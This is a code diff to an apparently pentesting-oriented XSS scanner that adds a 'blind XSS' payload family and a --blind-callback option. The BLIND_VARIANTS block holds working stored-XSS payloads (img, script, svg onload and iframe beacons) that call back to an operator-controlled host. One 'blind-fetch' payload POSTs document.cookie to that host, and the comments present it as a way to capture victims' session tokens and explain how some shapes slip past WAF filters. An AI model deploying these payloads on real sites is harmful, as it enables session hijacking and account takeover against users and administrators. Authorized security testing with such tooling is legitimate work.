@@ -413,12 +413,84 @@ def _waf_mutations(base_canary, marker):
     return [(name, xf(base_canary), xf(marker)) for name, xf in _WAF_MUTATIONS]
 
 
+# --- Phase 3.2: blind XSS payload family -----------------------------------
+#
+# Stored payloads that fire in someone else's session (admin panel moderator
+# queues, notification digests, audit logs). Every shape below embeds a URL
+# pointing at an operator-controlled callback server (Phase 3.1's
+# dxa_callback). When the payload eventually renders in a victim's browser,
+# the browser fetches the URL and the callback server records the hit.
+#
+# Placeholders in the tuples:
+#   {CALLBACK}  the value of module-level BLIND_CALLBACK (--blind-callback URL)
+#   {CID}       the freshly-minted cid for this canary
+#
+# Substitution happens in make_canaries_for(), NOT here - the strings stay
+# as templates so a caller can inspect / dump BLIND_VARIANTS without
+# BLIND_CALLBACK being set.
+#
+# Blind variants are NOT in PAYLOAD_VARIANTS by design: they're opt-in
+# (require a configured callback) and their verdict path is different
+# (the callback hit, not the response body). Phase 3.3 wires the
+# correlation path.
+
+BLIND_CALLBACK = ""  # populated by --blind-callback URL
+
+BLIND_VARIANTS = {
+    # Classic image beacon. Broadest browser coverage - renders in every
+    # HTML context that allows <img>, even in emails / feeds where <script>
+    # is scrubbed.
+    "blind-img": (
+        '"><img src={CALLBACK}/c/{CID}>',
+        '<img src={CALLBACK}/c/{CID}>',
+    ),
+    # <script src=...> external script pull. Bypasses filters that strip
+    # inline script content but pass <script src>. The .js response
+    # (from dxa_callback) parses as valid JS so the page doesn't error.
+    "blind-script": (
+        '"><script src={CALLBACK}/c/{CID}.js></script>',
+        '<script src={CALLBACK}/c/{CID}.js>',
+    ),
+    # Cookie exfiltration via fetch. When the payload lands in an
+    # authenticated victim's session, document.cookie carries the
+    # session token; POST body preview captures it.
+    "blind-fetch": (
+        '"><script>fetch("{CALLBACK}/c/{CID}",{method:"POST",body:document.cookie})</script>',
+        'fetch("{CALLBACK}/c/{CID}"',
+    ),
+    # <svg onload=...> ping. Bypasses many "block <img> beacons" WAFs
+    # that don't extend the block to SVG event handlers.
+    "blind-svg-onload": (
+        '"><svg onload="new Image().src=\'{CALLBACK}/c/{CID}\'">',
+        'new Image().src=\'{CALLBACK}/c/{CID}',
+    ),
+    # <iframe src=...> beacon. Some allowlist sanitizers permit iframes
+    # (for embed widgets) while blocking <img src=> with external hosts.
+    "blind-iframe": (
+        '"><iframe src={CALLBACK}/c/{CID}></iframe>',
+        '<iframe src={CALLBACK}/c/{CID}>',
+    ),
+}
+
+
 def make_canary(variant="body"):
     """A fresh, greppable, collision-free marker per injection.
     Backwards-compatible: `make_canary()` returns the historical body-context
     canary. Pass a variant name to get a context-tuned payload for v3.10
-    context-aware probing."""
+    context-aware probing.
+
+    Phase 3.2: blind-* variants embed BLIND_CALLBACK + cid into the URL
+    payload. When BLIND_CALLBACK is empty, blind variants substitute the
+    literal string `{CALLBACK}` and are effectively broken - callers
+    should validate --blind-callback is set before requesting them.
+    """
     cid = "dxa" + secrets.token_hex(4)
+    if variant.startswith("blind-"):
+        suffix, _marker = BLIND_VARIANTS.get(variant, BLIND_VARIANTS["blind-img"])
+        # cid is INSIDE the URL, not prepended - the payload is self-
+        # contained. Return the substituted canary directly.
+        canary = suffix.replace("{CALLBACK}", BLIND_CALLBACK).replace("{CID}", cid)
+        return cid, canary
     suffix, _marker = PAYLOAD_VARIANTS.get(variant, PAYLOAD_VARIANTS["body"])
     return cid, cid + suffix
 
@@ -432,10 +504,36 @@ def make_canaries_for(variants, waf_bypass=False):
     (case-swap, split-tag-comment, whitespace, URL-encode) with fresh cids.
     Mutation variant names are `<variant>/<mut>` (e.g. `body/case`,
     `title-breakout/split-cmt`). Every mutation has its own cid so verdicts
-    stay independent."""
+    stay independent.
+
+    Phase 3.2: blind-* variants are handled separately. Their suffix +
+    marker templates in BLIND_VARIANTS carry `{CALLBACK}` and `{CID}`
+    placeholders; both are substituted here at emit time. cid is embedded
+    IN the URL rather than prepended, because the URL is the payload."""
     for v in variants:
-        suffix, marker = PAYLOAD_VARIANTS.get(v, PAYLOAD_VARIANTS["body"])
         cid = "dxa" + secrets.token_hex(4)
+
+        if v.startswith("blind-"):
+            tmpl_suffix, tmpl_marker = BLIND_VARIANTS.get(
+                v, BLIND_VARIANTS["blind-img"])
+            if not BLIND_CALLBACK:
+                # No callback configured - silently skip. Alternative
+                # was to raise, but that would trip mass-variant runs
+                # (--variants all) whenever someone forgot --blind-callback.
+                continue
+            base_canary = (tmpl_suffix
+                           .replace("{CALLBACK}", BLIND_CALLBACK)
+                           .replace("{CID}", cid))
+            marker = (tmpl_marker
+                      .replace("{CALLBACK}", BLIND_CALLBACK)
+                      .replace("{CID}", cid))
+            yield v, cid, base_canary, marker
+            # Blind variants do NOT participate in WAF-bypass mutations
+            # today: the URL structure is fragile and each mutation
+            # would need per-shape verification to still resolve.
+            continue
+
+        suffix, marker = PAYLOAD_VARIANTS.get(v, PAYLOAD_VARIANTS["body"])
         base_canary = cid + suffix
         yield v, cid, base_canary, marker
         if not waf_bypass:
@@ -1968,6 +2066,19 @@ def main():
                          "true is checked against the canary marker. See "
                          "bench/flows/ for examples. Zero-dep (json > yaml).")
 
+    # Phase 3.2: blind XSS callback URL. When set, the `blind-*` variant
+    # family in BLIND_VARIANTS becomes selectable via --variants. Each
+    # canary embeds the URL + a fresh cid; when the payload eventually
+    # renders in a victim browser, the callback server (dxa_callback)
+    # records the hit. Correlation runs against /hits/<cid> (Phase 3.3).
+    ap.add_argument("--blind-callback", metavar="URL", default="",
+                    help="callback server base URL for blind XSS "
+                         "(e.g. http://your.tld:9999). Enables the "
+                         "blind-img / blind-script / blind-fetch / "
+                         "blind-svg-onload / blind-iframe variant "
+                         "family. Pair with `dxa_callback` running on "
+                         "that URL. Authorized targets only.")
+
     # Phase 2.1: browser (Playwright) - opt-in, prints install line if
     # playwright not on PATH. Later phases wire DOM-sink detection + JS
     # exec proof onto this harness.
@@ -2133,6 +2244,14 @@ def main():
         _hdr = f"header='{CSRF_HEADER_NAME}'" if CSRF_HEADER_NAME else "no header install"
         print(f"[dxadyn] csrf: refresh from {CSRF_REFRESH_URL} ({_hdr})")
 
+    # Phase 3.2: wire the blind XSS callback base URL into module state so
+    # BLIND_VARIANTS substitution knows where to point payloads.
+    global BLIND_CALLBACK
+    BLIND_CALLBACK = (args.blind_callback or "").rstrip("/")
+    if BLIND_CALLBACK:
+        print(f"[dxadyn] blind XSS enabled: callback={BLIND_CALLBACK} "
+              f"({len(BLIND_VARIANTS)} payload shapes)")
+
     if args.cookie:
         apply_cookie(args.cookie)
         print(f"[dxadyn] session cookie attached to every request ({len(args.cookie)} chars)")
@@ -2232,16 +2351,27 @@ def main():
                       ("json body" if args.json_body else
                        f"header='{args.header_target}'"))
 
-        # v3.10: resolve --variants (comma-list, or "all"); default = body
+        # v3.10: resolve --variants (comma-list, or "all"); default = body.
+        # Phase 3.2: `all` also pulls in blind-* variants when
+        # --blind-callback is set; blind-only variant names remain
+        # selectable individually as long as --blind-callback is provided.
         vraw = (args.variants or "body").strip().lower()
         if vraw == "all":
             variants = list(PAYLOAD_VARIANTS.keys())
+            if BLIND_CALLBACK:
+                variants += list(BLIND_VARIANTS.keys())
         else:
             variants = [v.strip() for v in vraw.split(",") if v.strip()]
-            unknown = [v for v in variants if v not in PAYLOAD_VARIANTS]
+            valid = set(PAYLOAD_VARIANTS) | set(BLIND_VARIANTS)
+            unknown = [v for v in variants if v not in valid]
             if unknown:
                 print(f"[dxadyn] unknown --variants: {unknown}. Valid: "
-                      f"{list(PAYLOAD_VARIANTS.keys())} or 'all'", file=sys.stderr)
+                      f"{sorted(valid)} or 'all'", file=sys.stderr)
+                sys.exit(2)
+            _blind_wanted = [v for v in variants if v.startswith("blind-")]
+            if _blind_wanted and not BLIND_CALLBACK:
+                print(f"[dxadyn] --variants {_blind_wanted} require "
+                      f"--blind-callback URL", file=sys.stderr)
                 sys.exit(2)
         vlabel = "" if variants == ["body"] else f" variants=[{','.join(variants)}]"
         if args.waf_bypass:
@@ -2318,16 +2448,25 @@ def main():
     if not args.url:
         ap.error("either a positional URL (reflected mode) or --stored is required")
 
-    # v3.10: reflected mode also honours --variants + --waf-bypass
+    # v3.10 + Phase 3.2: reflected mode also honours --variants + --waf-bypass;
+    # blind-* variants opt in when --blind-callback is set.
     vraw = (args.variants or "body").strip().lower()
     if vraw == "all":
         variants = list(PAYLOAD_VARIANTS.keys())
+        if BLIND_CALLBACK:
+            variants += list(BLIND_VARIANTS.keys())
     else:
         variants = [v.strip() for v in vraw.split(",") if v.strip()]
-        unknown = [v for v in variants if v not in PAYLOAD_VARIANTS]
+        valid = set(PAYLOAD_VARIANTS) | set(BLIND_VARIANTS)
+        unknown = [v for v in variants if v not in valid]
         if unknown:
             print(f"[dxadyn] unknown --variants: {unknown}. Valid: "
-                  f"{list(PAYLOAD_VARIANTS.keys())} or 'all'", file=sys.stderr)
+                  f"{sorted(valid)} or 'all'", file=sys.stderr)
+            sys.exit(2)
+        _blind_wanted = [v for v in variants if v.startswith("blind-")]
+        if _blind_wanted and not BLIND_CALLBACK:
+            print(f"[dxadyn] --variants {_blind_wanted} require "
+                  f"--blind-callback URL", file=sys.stderr)
             sys.exit(2)
     vlabel = "" if variants == ["body"] else f" variants=[{','.join(variants)}]"
     if args.waf_bypass:
